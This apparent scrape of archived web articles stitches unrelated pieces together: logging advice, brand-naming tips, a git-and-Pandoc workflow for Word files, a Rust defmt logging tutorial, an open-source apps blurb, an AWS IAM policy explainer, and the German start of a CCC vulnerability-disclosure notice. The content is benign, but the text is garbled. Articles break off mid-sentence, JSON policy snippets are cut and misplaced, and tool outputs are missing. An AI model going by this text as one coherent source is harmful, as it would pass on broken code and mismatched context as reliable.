            <p>Hopefully, everyone agrees that you should have some form of logging in your production systems. I would also hope that nowadays everyone agrees that using some kind of centralised logging system that you can access without SSHing onto production boxes is the right way to do things.</p>

<p>But what should we log?</p>

<p>Typically we log errors and exceptions, we want to see when things go wrong. With this logging in place when we see a 500 error on the server we simply go and check the logs to see what the problem is.</p>

<p>We can also monitor our logs and detect an increase in errors - this can alert us to problems before they have a large impact on users.</p>

<p>To me, this is the bare minimum of logging - errors and exceptions.</p>

<p>What we also need are logs that follow the happy path of the code, we should be able to see that the code is flowing in the way we expect it to.</p>

<p>Why do we need this? What do we do when a user reports a problem?</p>

<p>Go and check the logs to see if something is broken - no errors or exceptions - what do we do now?</p>

<p>We need to be able to follow the code through its path of execution and see where it deviates from what we expect:</p>

<blockquote>
  <p><strong>The user says: “emails aren’t being sent”:</strong></p>

  <p>Check the logs, I can see the system was told to send an email, I can see it generated the template, I don’t see it sending the email - there’s something wrong in the code after template generation.”</p>
</blockquote>

<p>This is an invaluable tool in our debugging arsenal saving us a huge amount of troubleshooting time.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  



  <p><img src="https://d33wubrfki0l68.cloudfront.net/3a8e939667e3734b84dff063fff3965fe824553c/d7922/uploads/good-names.jpg" alt=""></p>

<p>In <a href="https://toolbox.humandeluxe.com/2020/08/07/how-to-name">this video</a>, I walked you through our naming process. We usually work in a workshop format to create a long list of potential brand names for our clients. This can be done either remote or onsite. If you’ve missed this it the last time, make sure you watch the video first:</p>

<iframe width="560" height="420" src="https://www.youtube.com/embed/T8Hlbp8mp_I?color=white&amp;theme=light"></iframe>

<p>Once we have the long list of names, how do we make the selection? How do we distinguish between good and bad brand names?</p>

<p>The process is twofold: On the one side, we need too identify good brand names, on the other side we need to exclude all the bad names. So let’s look at the first part: How do you create a good brand name?</p>

<h2 id="what-makes-a-good-brand-name">What makes a good brand name?</h2>

<p>At Human Deluxe, we follow the teachings of Alexandra Watkins, who created the SMILE &amp; SCRATCH principles: Good names make you smile, bad names leave you scratch your head. Of course, these are Acronyms, so let’s look at how to make yourself SMILE with a good name:</p>

<p>The qualities of a good name:</p>

<p><strong>Suggestive</strong>: A good name will give you a hint of a positive brand experience. It will suggest the rest of the brand for you. Great examples of this are travel company KAYAK or streaming service Pandora: Once you open the streaming box, it would not stop playing – clever, right?</p>

<p><strong>Meaningful</strong> A good name resonates with your target audience. Not only do they feel good, but they already know what to expect. Obvious examples of this are domain provider Namecheap, diet drink Slimfast or even good old Facebook.</p>

<p><strong>Imagery</strong> A great name is visually evocative. It creates a picture in your head that people will instantly associate with your brand. Even if a name is abstract, it will be able to give your audience a certain association and idea of what it could look like. Think of brands like: Caterpilar or Citibank – these are great examples.</p>

<p><strong>Legs</strong> Like a good hiker, a great name has strong legs. It lends itself to a theme for extra mileage: A name with great legs can shine through to the whole brand, directing the tonality and vocabulary. Personally, I like how twitter worked that in: A single microblogpost is a Tweet, the logo is a bird, even certain icons would be bird-themed, like the birdhouse Home button or the egg avatar.</p>

<p><strong>Emotional</strong> A good brand name moves people. does not only work in their mind, it touches their heart. This works for both B2C and B2B companies. Business brands don’t have to be boring. In fact, they can swing up to greater heights if they have an emotional impact, distinguishing themselves from their dull competition. Brands that are brave enough to be emotional do connect with humans like no other. Take Yahoo! or Greenpeace for example – it works.</p>

<p>If you want to figure out if your brand is good, your name for these criterias. At best, a good name ticks all of them. At least, your name should check one or two criterias. At any cost, avoid head scratchers names. In our next article, we will explain what these are and how you identify them.

<p>One of the major challenges of writing a journal article is to keep track of versions - both the different versions you create as the document progresses, and to merge in the changes made by your collaborators. For most academics Microsoft Word is the default writing tool, and it is both very good and very bad in this. Very good because the <em>track changes</em> feature makes it easy to see what has changed since the last version and who made the changes. Very bad because this feature is built around keeping everything in a single Word document, so that only one person can work on on a manuscript at a time. This usually means sending manuscripts around by email, and being very careful about not confusing different versions of the document, which requires <a href="http://www.phdcomics.com/comics/archive.php?comicid=1531">creativity</a>.<!--more--></p>
<p>Approaches to overcome these challenges are to a) integrate the Word documents into collaboration tools such as Sharepoint and Office 365, or document sharing services such as Dropbox and Google Docs (if you use it just for that), or b) use a different authoring tool altogether. If neither of these approaches works for you, you have a third option: use the version control system <strong>git</strong>.</p>
<p><a href="http://www.mulvany.net/presentations/WikimaniaOpenScholarshipTalk.slides.html#/3">Git</a> is software that helps with <a href="https://blog.martinfenner.org/2014/08/25/using-microsoft-word-with-git/(http://git-scm.com/book/en/Getting-Started-About-Version-Control)">tracking changes to files</a> so that you can recall specific versions later. Git is typically used to track changes of software source code (and was originally developed by Linus Torvalds for Linux kernel development in 2005), but in fact git can be used for any file where we need to keep track of versions over time. Git is open source software that runs locally on your computer, so please go ahead and start tracking changes to your manuscripts (or other complex documents) with git. Any time you want to store a version, do a <code>git commit</code> with a little description and an optional tag.</p>
<p>This approach is not ideal, as git was written with source code in text format in mind and for example doesn’t understand what has changed between two revisions of a Word document. Some people will tell you to never store binary files in a version control system, but don’t listen to them. Instead give git a tool to convert Word documents into plain text, and git will then happily tell you what has changed between revisions. Several tools can do this, but since earlier this month Pandoc can read Word documents in <code>docx</code> format. Do the following to have Pandoc convert Word documents into markdown, and to compare the revisions by word and not by line (which makes more sense):</p>
<pre><code># .gitattributes file in root folder of your git project
*.docx diff=pandoc</code></pre>
<pre><code># .gitconfig file in your home folder
[diff "pandoc"]
  textconv=pandoc --to=markdown
  prompt = false
[alias]
  wdiff = diff --word-diff=color --unified=1</code></pre>
<p>You can then use <code>git wdiff important_file.docx</code> to see the changes (with deletions in red and insertions in green), or <code>git log -p --word-diff=color important_file.docx</code> to see all changes over time.</p>
<p>While you can now track revisions of a Word document and see the changes, you also want to be able to merge different versions of a Word document together so that you and your collaborators can work on the manuscript in parallel. Git can’t merge binary files together, so you need to first convert the Word document into a format that git understands. Just as in the previous example we can use Pandoc for that, with markdown as the textual format. This would also work with HTML or LaTeX, but the simplicity of markdown makes it better suited for version control which doesn’t know about the markup of these formats.</p>
<p>One of the reasons that git became so popular with software developers is that it is a <strong>distributed version control system</strong> instead of a centralized system such as Subversion. This means that you can track all revisions locally on your computer, but can still synchronize your revisions with another user. <strong>Github</strong> is a popular service that facilitates this synchronization and adds some nice features on top. One way to collaborate with your co-authors is therefore to set up a Github repository (public or private) for your manuscript, and store the master version of the manuscript in markdown format. Instead of working on the master version directly, you would use Pandoc to convert back and forth between this master version in markdown format and your Word document, and would continue to use Word as authoring tool. <a href="https://blog.martinfenner.org/2014/08/18/introducing-rakali/">Rakali</a> is a Pandoc tool that I released last week that can help automate this document conversion. Github has a a number of features to facilitate collaboration that can be used here, e.g.&nbsp;Github issues for discussion and task management.</p>
<p>There are still a few rough edges in the workflow described above (e.g.&nbsp;only partial support of Word track changes), but it is an interesting approach to collaborate using Microsoft Word and git. And this workflow can of course be enhanced to also include authors that write in LaTeX or one of the other formats that Pandoc supports. One nice side effect of using markdown is that Github will automatically render a webpage for the document (which it will not do for HTML without extra effort).</p>

August 28, 2020 | https://ferrous-systems.com/blog/defmt/ | <a href="https://web.archive.org/web/*/https://ferrous-systems.com/blog/defmt/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Today we are thrilled to announce the public release of <a href="https://github.com/knurling-rs/defmt"><code>defmt</code></a> ("de format").
<code>defmt</code> stands for "deferred formatting" and it's a highly efficient logging framework.
As we covered in <a href="https://ferrous-systems.com/blog/21st-century-embedded-tooling/">our blog post about embedded tooling for the 21st century</a> we hope <code>defmt</code> will serve as the base for features like data visualization and interactive logging front-ends.
In this post we'll cover how to use <code>defmt</code> with <code>probe-rs</code> supported devices and what you can do with <code>defmt</code> today.</p>



<p>We have created a <a href="https://github.com/knurling-rs/app-template">Cargo project template</a> to make the setup easier.
Here are the setup steps.</p>

<ol>
  <li>Install the <strong>git</strong> version of <code>probe-run</code>, <a href="https://ferrous-systems.com/blog/probe-run/">a custom Cargo runner that lets you run embedded apps if they were native apps</a>. Be sure to enable the <code>defmt</code> Cargo feature!</li>
</ol>

<div><pre><code><span>$</span> cargo install <span>\</span>
    <span>--git</span> https://github.com/knurling-rs/probe-run <span>\</span>
    <span>--branch</span> main <span>\</span>
    <span>--features</span> defmt
</code></pre></div>
<ol>
  <li>Either initialize the project template with <a href="https://crates.io/crates/cargo-generate"><code>cargo-generate</code></a> or <a href="https://github.com/knurling-rs/app-template/archive/master.zip">fetch a copy</a> and initialize the <code>Cargo.toml</code> manually.</li>
</ol>

<div><pre><code><span>$</span> cargo generate <span>\</span>
    <span>--git</span> https://github.com/knurling-rs/app-template <span>\</span>
    <span>--branch</span> main <span>\</span>
    <span>--name</span> my-app
</code></pre></div>
<p>If you are not using <code>cargo-generate</code> you'll need to manually enter the <code>author</code> and <code>name</code> fields in <code>Cargo.toml</code>.</p>

<div><pre><code> # Cargo.toml
 [package]
<span>-# authors = ["{{authors}}"]
-# name = "{{project-name}}"
</span><span>+name = "my-app"
</span></code></pre></div>
<p>After that there are a few TODOs in the template.
You can <a href="https://github.com/BurntSushi/ripgrep"><code>ripgrep</code></a> for the word TODO (<code>rg TODO .cargo .</code>) to find them but we'll walk you through all of them in this blog post.</p>

<ol>
  <li>Pick a chip from <code>probe-run --list-chips</code> and enter it into <code>.cargo/config.toml</code>.</li>
</ol>

<p>If, for example, you have a nRF52840 Development Kit from one of <a href="https://github.com/ferrous-systems/embedded-trainings-2020">our workshops</a> then replace <code>{{chip}}</code> with <code>nRF52840_xxAA</code>.</p>

<div><pre><code> # .cargo/config.toml
 [target.'cfg(all(target_arch = "arm", target_os = "none"))']
<span>-runner = "probe-run --chip {{chip}} --defmt"
</span><span>+runner = "probe-run --chip nRF52840_xxAA --defmt"
</span></code></pre></div>
<ol>
  <li>Adjust the compilation target in <code>.cargo/config.toml</code>.</li>
</ol>

<p>For the nRF52840 chip you'll want to use the <code>thumbv7em-none-eabihf</code> target.</p>

<div><pre><code> # .cargo/config.toml
 [build]
<span>-target = "thumbv6m-none-eabi"    # Cortex-M0 and Cortex-M0+
-# target = "thumbv7m-none-eabi"    # Cortex-M3
-# target = "thumbv7em-none-eabi"   # Cortex-M4 and Cortex-M7 (no FPU)
-# target = "thumbv7em-none-eabihf" # Cortex-M4F and Cortex-M7F (with FPU)
</span><span>+target = "thumbv7em-none-eabihf" # Cortex-M4F (with FPU)
</span></code></pre></div>
<ol>
  <li>Add a HAL as a dependency.</li>
</ol>

<p>For the nRF52840 you'll want to use the <a href="https://crates.io/crates/nrf52840-hal"><code>nrf52840-hal</code></a>.</p>

<div><pre><code> # Cargo.toml
 [dependencies]
<span>-# some-hal = "1.2.3"
</span><span>+nrf52840-hal = "0.11.0"
</span></code></pre></div>
<ol>
  <li>Now that you have selected a HAL fix the HAL import in <code>src/lib.rs</code></li>
</ol>

<div><pre><code> // my-app/src/lib.rs
<span>-// use some_hal as _; // memory layout
</span><span>+use nrf52840_hal as _; // memory layout
</span></code></pre></div>


<p>You are now all set to <code>cargo-run</code> your first <code>defmt</code>-powered application!
There are some examples in the <code>src/bin</code> directory.</p>

<div><pre><code><span>// my-app/src/bin/hello.rs</span>

<span>#</span><span>!</span><span>[</span><span>no_main</span><span>]</span>
<span>#</span><span>!</span><span>[</span><span>no_std</span><span>]</span>

<span>use</span> <span>my_app</span> <span>as</span> <span>_</span><span>;</span> <span>// global logger + panicking-behavior + memory layout</span>

<span>#[cortex_m_rt</span><span>::</span><span>entry]</span>
<span>fn</span> <span>main</span><span>()</span> <span>-&gt;</span> <span>!</span> <span>{</span>
    <span>defmt</span><span>::</span><span>info!</span><span>(</span><span>"Hello, world!"</span><span>);</span>

    <span>my_app</span><span>::</span><span>exit</span><span>()</span>
<span>}</span>
</code></pre></div>
<p><code>cargo run</code>-ning this program produces the classic "Hello, world!" output.</p>

<div><pre><code><span>$</span> <span># `rb` is an alias for `run --bin`</span>
<span>$</span> cargo rb hello
<span>    Finished dev [optimized + debuginfo] target(s) in 0.03s
flashing program ..
DONE
resetting device
0.000000 INFO Hello, world!
(..)

</span><span>$</span> <span>echo</span> <span>$?</span>
<span>0
</span></code></pre></div>
<p>Or if you are using VS code + Rust-Analyzer, instead, you can open the <code>src/bin/hello.rs</code> file and <a href="https://ferrous-systems.com/blog/run-rust-on-your-embedded-device-from-vscode/">click the "Run" button as we demonstrated in a previous blog post</a>.</p>

<p>Now let's take a closer look at the features of the framework.
This post will be a quick overview.
For more details check out <a href="https://defmt.ferrous-systems.com/">the <code>defmt</code> book</a>.</p>



<p>We have wired the <code>panic_handler</code> to <code>defmt</code> to make panicking much cheaper.
Consider this example, which is part of the project template:</p>

<div><pre><code><span>// my-app/src/bin/panic.rs</span>

<span>#[cortex_m_rt</span><span>::</span><span>entry]</span>
<span>fn</span> <span>main</span><span>()</span> <span>-&gt;</span> <span>!</span> <span>{</span>
    <span>defmt</span><span>::</span><span>info!</span><span>(</span><span>"main"</span><span>);</span>

    <span>panic!</span><span>()</span>
<span>}</span>
</code></pre></div>
<p>It produces this output:</p>

<div><pre><code><span>$</span> cargo rb panic
<span>0.000000 INFO main
0.000001 ERROR panicked at src/bin/panic.rs:11:5
stack backtrace:
   0: 0x00000554 - __bkpt

   2: 0x00000514 - rust_begin_unwind

   7: 0x00000238 - ResetTrampoline
   8: 0x00000214 - Reset
</span></code></pre></div>
<p>As you may have seen from our previous posts with <code>probe-run</code> you get a stack backtrace for free!</p>

<h2 id="binary-size">Binary size</h2>

<p>What I wanted to highlight here is the binary size.
Here's the output of <code>cargo-size</code> (part of the <a href="https://crates.io/crates/cargo-binutils"><code>cargo-binutils</code></a> project).</p>

<div><pre><code><span>$</span> cargo size <span>--bin</span> panic <span>--</span> <span>-A</span>

</span></code></pre></div>
<p>An here's the output of <a href="https://crates.io/crates/cargo-bloat"><code>cargo-bloat</code></a></p>

<p>There are <strong>no</strong> <code>core::fmt</code> function calls there and that's what makes the binary so small.</p>

<h2 id="vs-rprintln">vs <code>rprintln!</code></h2>

<p>Let's compare against a program that uses <a href="https://docs.rs/rtt-target/0.2.0/rtt_target/macro.rprintln.html"><code>rtt_target::rprintln</code></a>, which is hard-wired to <code>core::fmt</code>.</p>

<p>The biggest functions are <code>core::fmt</code> related.
The <code>defmt</code>-powered <code>panic</code> uses 1.59 KB of Flash (<code>.text</code> + <code>.rodata</code>); <code>panic-rprintln</code> uses 13.85 KB.
That's almost a whopping 9x savings.

<p><em>programs compiled with <code>-Oz</code> and <code>lto=fat</code></em></p>

<p>Now you can panic without reservation: panic messages are no longer binary-size expensive.
Also, no more need to reach out for crates that discard panic information, like <a href="https://crates.io/crates/panic-halt"><code>panic-halt</code></a>, to keep the binary size low.</p>



<p>If you have used the <code>log</code> crate before you know that it supports 5 logging levels: trace, debug, info, warn and error – sorted from lowest severity to highest.
<code>defmt</code> supports the same five levels through 5 logging macros: <code>trace!</code>, <code>debug!</code>, <code>info!</code>, <code>warn!</code> and <code>error!</code>.
Let's see them in action:</p>

<div><pre><code><span>// my-app/src/bin/levels.rs</span>

<span>#[cortex_m_rt</span><span>::</span><span>entry]</span>
<span>fn</span> <span>main</span><span>()</span> <span>-&gt;</span> <span>!</span> <span>{</span>
    <span>defmt</span><span>::</span><span>info!</span><span>(</span><span>"info"</span><span>);</span>
    <span>defmt</span><span>::</span><span>trace!</span><span>(</span><span>"trace"</span><span>);</span>
    <span>defmt</span><span>::</span><span>warn!</span><span>(</span><span>"warn"</span><span>);</span>
    <span>defmt</span><span>::</span><span>debug!</span><span>(</span><span>"debug"</span><span>);</span>
    <span>defmt</span><span>::</span><span>error!</span><span>(</span><span>"error"</span><span>);</span>

    <span>my_app</span><span>::</span><span>exit</span><span>()</span>
<span>}</span>
</code></pre></div>
<p>This is the output:</p>

<div><pre><code><span>$</span> cargo rb levels
<span>0.000000 INFO info
0.000001 TRACE trace
0.000002 WARN warn
0.000003 DEBUG debug
0.000004 ERROR error
</span></code></pre></div>
<p>Not shown above but the logging level (e.g. INFO) gets nicely colored in the terminal output.</p>

<h2 id="filters">Filters</h2>

<p>The main reason for having logging levels is to be able to filter some of them out.
If we re-run the <code>levels</code> example but compile it using the <code>release</code> profile we get less output:</p>

<div><pre><code><span>$</span> <span># `rrb` is an alias for `run --release --bin`</span>
<span>$</span> cargo rrb levels
<span>0.000000 INFO info
0.000001 WARN warn
0.000002 ERROR error
</span></code></pre></div>
<p>This is because the project template has been configured to report all logging levels when the <code>dev</code> profile is used, but only INFO and higher severity logs when the <code>release</code> profile is used.</p>

<p><code>defmt</code> defaults to logging nothing (filtering everything out) but this behavior can be configured via Cargo features.</p>

<p>If you look at the project template's <code>Cargo.toml</code> you'll see that the <code>defmt-default</code> feature is enabled for the top crate (<code>my-app</code>):</p>

<div><pre><code><span>[features]</span>
<span>default</span> <span>=</span> <span>[</span>
  <span>"defmt-default"</span><span>,</span>
<span># "dependency-a/defmt-trace",</span>
<span>]</span>
</code></pre></div>
<p>The <code>defmt-default</code> behavior logs at TRACE level and higher severity if profile is <code>dev</code> and log INFO and up if profile is <code>release</code>.
The other features like <code>defmt-warning</code> enable logging at the specified level (WARN) and up regardless of the compilation profile (<code>dev</code> or <code>release</code>).</p>

<p>Logging filters can be configured per crate using Cargo features.
If you have used the <a href="https://docs.rs/env_logger/0.7.1/env_logger/"><code>env_logger</code></a> crate you may have used the <code>RUST_LOG</code> environment variable to enable logging in dependencies.
With <code>env_logger</code> you use <code>RUST_LOG=dep-a=debug,dep-b=info</code> to enable DEBUG logging in <code>dep-a</code> and INFO logging in <code>dep-b</code>.
With <code>defmt</code> that configuration is done in the top crate's <code>Cargo.toml</code> as shown below:</p>

<div><pre><code> # Cargo.toml
 [features]
 default = [
   "defmt-default",
<span>-# "dependency-a/defmt-trace",
</span><span>+  "dep-a/defmt-debug",
+  "dep-b/defmt-info",
</span> ]
</code></pre></div>


<p>So far we have only logged string literals in our examples but <code>defmt</code> also supports formatting arguments.
<code>core::write!</code> supports a variety of formatting parameters, each one associated to a formatting trait: <code>{:?}</code> (<code>Debug</code>), <code>{}</code> (<code>Display</code>), <code>{:x}</code> (<code>Hex</code>).
<code>defmt</code> has a single formatting trait: <code>Format</code>, which is associated to the <code>{:?}</code> formatting parameter.</p>

<p><code>{:?}</code> expects a type that implements the <code>Format</code> trait.
<code>Format</code> is implemented for primitives like integers and slices.
To implement <code>Format</code> for user-defined types (structs or enums) use the <code>#[derive(Format)]</code> attribute.</p>

<p>In addition to <code>{:?}</code>, there are formatting parameters for some primitives: e.g. <code>{:u8}</code>, <code>{:bool}</code>.
Prefer these parameters for primitives as they compress the …</p></div></div>

Because its free in every sense of the word, its especially good for companies and groups that want to self host their software due to concerns over privacy and control. Other times open source solutions are chosen by those who simply want to have the freedom to use a consistent set of tools that are not tied to a single vendor. The only problem is that there is <i>so much of it</i>. It is hard to sort through it all. So to save you the trouble, we are sharing our picks about what we consider to be the best of the best open social software out there. Enjoy!</p><p>By the way we might have jumped the gun a bit with the title but 2021 is almost here. We're pretty sure these apps will stand the test of time. We use these apps ourselves every day, we have deployed them on behalf of our clients and we are confident they will remain highly competitive options throughout 2021, and if that changes we'll update this article. Good Luck!</p><p>If these apps aren't your cup of tea, we have good news. There are hundreds of other free social apps that you can search for on github.com. Content management systems, workflow tools, collaborative document editing, microblogging software and more. Have we missed anything important?

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p>The IAM policy is the cornerstone of security of an AWS account. There is an oft-repeated notion of the shared responsibility model that stipulates that certain parts of security is the responsibility of the cloud provider, such as preventing malicious parties physical access to the infrastructure. On the other hand, the cloud provider gives you security controls and it is your responsibility to use them properly.</p> <p>The main security control is IAM and it is used everywhere inside AWS. With IAM you are not only able to create users for people who need access to the account but also to define what each user has access to.</p> <p>There are several types of policies, but the two most important ones are the identity-, and the resource-based policies. Whatever you do in your AWS account you’ll need to use these.</p> <h2 id="identity-based-policies">Identity-based policies</h2> <p>Identity-based policies are the easier of the two, as some variation of it is present in most systems. They <strong>define what an identity can do</strong>, such as a user has access to an S3 bucket.</p> <p>There are two types of identities in AWS: <strong>users and roles</strong>. By attaching a policy to an identity you can give it permissions to access resources. For example, you can attach this policy to allow a user to read an object in an S3 bucket:</p> <div><div><pre><code><span>{</span><span>
	</span><span>"Version"</span><span>:</span><span> </span><span>"2012-10-17"</span><span>,</span><span>

Also, it’s likely that multiple people have the same job, so permissions are usually attached to groups instead of the users themselves.</p> <p><svg xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="" style="width:301px;height:387px" viewBox="0 0 301 387"><defs><filter height="300%" id="prefix__a" width="300%" x="-1" y="-1"><feGaussianBlur result="blurOut" stdDeviation="2"></feGaussianBlur><feColorMatrix in="blurOut" result="blurOut2" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 .4 0"></feColorMatrix><feOffset dx="4" dy="4" in="blurOut2" result="blurOut3"></feOffset><feBlend in="SourceGraphic" in2="blurOut3"></feBlend></filter></defs><ellipse cx="96" cy="18" fill="#FEFECE" filter="url(#prefix__a)" rx="8" ry="8" stroke="#A80036" stroke-width="2.0"></ellipse><path d="M96 26v27M83 34h26M96 53L83 68m13-15l13 15" fill="none" filter="url(#prefix__a)" stroke="#A80036" stroke-width="2.0"></path><text font-family="sans-serif" font-size="14" lengthAdjust="spacingAndGlyphs" textLength="28" x="82" y="87.995">Bob</text><path fill="#FEFECE" filter="url(#prefix__a)" d="M56 172.5H136V208.797H56z" stroke="#A80036" stroke-width="1.5"></path><text font-family="sans-serif" font-size="14" lengthAdjust="spacingAndGlyphs" textLength="60" x="66" y="195.495">IAM User</text><path d="M221 178c0-10 34-10 34-10s34 0 34 10v25.297c0 10-34 10-34 10s-34 0-34-10V178" fill="#FEFECE" filter="url(#prefix__a)" stroke="#000000" stroke-width="1.5"></path><path d="M221 178c0 10 34 10 34 10s34 0 34-10" fill="none" stroke="#000000" stroke-width="1.5"></path><text font-family="sans-serif" font-size="14" lengthAdjust="spacingAndGlyphs" textLength="48" x="231" y="204.995">bucket</text><path fill="#FEFECE" filter="url(#prefix__a)" d="M6 274L6 350.891 186 350.891 186 284 176 274 6 274z" stroke="#000000" stroke-width="1.5"></path><path d="M176 274v10h10" fill="#FEFECE" stroke="#000000" stroke-width="1.5"></path><text font-family="sans-serif" font-size="14" lengthAdjust="spacingAndGlyphs" textLength="39" x="16" y="296.995">policy</text><path d="M7 300.297L185 300.297M7 302.297L185 302.297" stroke="#000000" stroke-width="1.0"></path><text font-family="sans-serif" font-size="14" lengthAdjust="spacingAndGlyphs" textLength="144" x="22" y="317.292">Action: s3:GetObject</text><text font-family="sans-serif" font-size="14" lengthAdjust="spacingAndGlyphs" textLength="148" x="22" y="333.589">Resource: &lt;bucket&gt;</text><path d="M96 91.08v75.84" fill="none" stroke="#A80036" stroke-width="1.0"></path><path fill="#A80036" d="M96 172.15L100 163.15 96 167.15 92 163.15 96 172.15z" stroke="#A80036" stroke-width="1.0"></path><text font-family="sans-serif" font-size="13" lengthAdjust="spacingAndGlyphs" textLength="30" x="97" y="134.067">uses</text><path d="M96 208.69v65.11" fill="none" stroke="#A80036" stroke-width="1.0"></path><path d="M136.12 190.5h79.63" fill="none" stroke="#A80036" stroke-width="1.0"></path><path fill="#A80036" d="M220.82 190.5L211.82 186.5 215.82 190.5 211.82 194.5 220.82 190.5z" stroke="#A80036" stroke-width="1.0"></path><text font-family="sans-serif" font-size="13" lengthAdjust="spacingAndGlyphs" textLength="48" x="154.5" y="183.567">Allowed</text><text font-family="sans-serif" font-size="14" lengthAdjust="spacingAndGlyphs" textLength="223" x="42" y="373.995">A natural user is tied to a person</text></svg> </p> <p>Technical users allow other services access to resources inside the account.

To give access to your account, you can use a role that can be used by identities in another account. This way you don’t need to create users and transfer secrets (passwords or access keys) to grant cross-account access. Another use-case is users logging in via SAML or Cognito. Instead of creating a user for every single person who can log in, you define a role and all users assume it. Then you can give permissions to the role and all users signed in this way will gain those permissions.</p> <p>Also, AWS services use roles to gain permissions to access your account. For example, CloudTrail can put logs into a CloudWatch Log group, but it needs permission to do so. On the Trail config, you need to specify a role:</p> <p><img src="https://advancedweb.hu/assets/posts/iam_identity_resource_policies/cloudtrail_role-72cf0208de53148da9ebb597ccf983890b3c5c8ba59222865e849f81918718c9.png" integrity="sha256-cs8CCN5TFI2p67WXzPmDiQs8XIulkiKGXoSfgZGHGMk=" crossorigin="anonymous"></p> <p>This role allows the CloudTrail service to assume it:</p> <p><img src="https://advancedweb.hu/assets/posts/iam_identity_resource_policies/cloudtrail_role_trust-88790c9eb727ab035fd2e4d564b15ca8bb07951376ea75da8e0918ce8d92983f.png" integrity="sha256-iHkMnrcnqwNf0uTVZLFcqLsHlRN26nXajgkYzo2SmD8=" crossorigin="anonymous"></p> <p>And the role has the policies to access CloudWatch Logs:</p> <p><img src="https://advancedweb.hu/assets/posts/iam_identity_resource_policies/cloudtrail_permissions-e536a8a0d9a50b84c797d688f891bdc7440c1a6c010d919b7e6bc9854dee03bd.png" integrity="sha256-5TaooNmlC4THl9aI+JG9x0QMGmwBDZGbfmvJhU3uA70=" crossorigin="anonymous"></p> <p>This way you have full control over what a given service can do. And this pattern appears in many places. A Lambda function uses a role in a similar way, the S3 bucket replication gains permissions to write a bucket using a role, and AWS Organizations creates a role in the member account so that you can initialize the resources inside it.</p> <h2 id="resource-based-policies">Resource-based policies</h2> <p>What if there is no identity to attach the policies to? This is the case for anonymous access, and also when an AWS service does not use a service role, such as an API Gateway. When there is no identity, identity-based policies can not be used.</p> <p>Many, but not all, AWS services <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_aws-services-that-work-with-iam.html">support resource-based policies</a>.

	</span><span>"Version"</span><span>:</span><span> </span><span>"2012-10-17"</span><span>,</span><span>
	</span><span>"Statement"</span><span>:</span><span> </span><span>[</span><span>
		</span><span>{</span><span>
			</span><span>"Effect"</span><span>:</span><span> </span><span>"Allow"</span><span>,</span><span>
			</span><span>"Principal"</span><span>:</span><span> </span><span>{</span><span>
				</span><span>"Service"</span><span>:</span><span> </span><span>"lambda.amazonaws.com"</span><span>
			</span><span>},</span><span>
			</span><span>"Action"</span><span>:</span><span> </span><span>"sts:AssumeRole"</span><span>
		</span><span>}</span><span>
	</span><span>]</span><span>
</span><span>}</span><span>
</span></code></pre></div></div> <p>The <code>Action</code> in resource-based policies can be one that is relevant to the service. A bucket policy can allow <code>s3:GetObject</code>, a role the <code>sts:AssumeRole</code>, while a Lambda the <code>lambda:InvokeFunction</code>.</p> <p>And the <code>Resource,</code> when needed, can only start with the resource’s own ARN. This makes sense as one resource can only give access to itself or things below it but not to unrelated resources.</p> <p>How the resource defines who gets access and how specific this control is depends on the service. The <code>Principal</code> element is always present and that can define users, roles, services, other accounts, and <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_elements_principal.html">a few other things</a>.</p> <p>But, especially with services, this is not granular enough. For example, when a role’s trust policy defines the Lambda service, it does not specify <em>which</em> Lambda function to trust. Similarly, the role for the CloudTrail allows the <code>cloudtrail.amazonaws.com</code> service, but there is no further restrictions on <em>which trail</em>.</p> <p>Some resource policies support conditions to allow only a given resource. For example, the policy for a Lambda function is able to selectively allow the API which can call it:</p> <div><div><pre><code><span>"Condition"</span><span>:</span><span> </span><span>{</span><span>
	</span><span>"ArnLike"</span><span>:</span><span> </span><span>{</span><span>
		</span><span>"AWS:SourceArn"</span><span>:</span><span> </span><span>"&lt;api gw arn&gt;/sign/*/*"</span><span>
	</span><span>}</span><span>
</span><span>}</span><span>
</span></code></pre></div></div> <p>Unfortunately, there is no generic way to know which resource-based policies support further restrictions on the caller using conditions. You need to check the AWS-provided policy examples to see what conditions are possible.</p> <h2 id="using-together">Using together</h2> <p>When both types of policies are effective then you can use both to give and restrict access. When an IAM user wants to get an object from an S3 bucket then both the policy attached to the user and the one defined on the bucket are effective.</p> <h3 id="allowing-access">Allowing access</h3> <p>With most services if <em>either</em> of the policies give access to an action then it will be granted. The notable exceptions are KMS key policies and cross-account role trust policies where <em>both</em> the resource and the identity needs an explicit Allow.</p> <p>As resource-based policies can grant access to identities, the notion that a user can not do anything without attaching policies to it is not true. For example, a bucket policy can allow a user to get objects and that is effective even if the user has no permissions on its own:</p> <div><div><pre><code><span>{</span><span>

August 27, 2020 | https://www.ccc.de/de/updates/2020/digitale-corona-listen | <a href="https://web.archive.org/web/*/https://www.ccc.de/de/updates/2020/digitale-corona-listen">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Mitglieder des Chaos Computer Clubs (CCC) haben mehrere Schwachstellen in einem weit verbreiteten Cloud-System für gastronomische Betriebe entdeckt und gemeldet. In Corona-Listen und Reservierungen waren mehrere Millionen sensible Datensätze einsehbar. Der Datenbestand reichte bis zu zehn Jahre zurück. Der Cloud-Service wurde informiert und hat die Schwachstellen nach eigenen Angaben beseitigt. Der CCC empfiehlt den Verzicht auf Cloud-Lösungen und rät dazu, Daten da zu sammeln, wo sie benötigt werden – in den Restaurants.</p><div><p>Das <a href="https://cert.ccc.de/">Chaos Emergency Response Team (CERT)</a> ist vielen bekannt als das Sanitäts- und Brandschutz-Team auf <a href="https://events.ccc.de/">Veranstaltungen des CCC</a>. Doch auch in der veranstaltungsfreien Zeit engagiert sich das CERT stets für die Sicherheit seines Umfelds.</p>
<h2>Digitale Corona-Listen</h2>
<p>Bei einem gemeinsamen Restaurantbesuch wurden Mitglieder des CERT gebeten, sich in eine <em>digitale</em> "Corona-Liste" einzutragen. Die gastgebenden Gastronominnen wollten die verpflichtende Datenerfassung offenbar modern und unkompliziert gestalten – mit Hilfe einer Cloud-Software.</p>
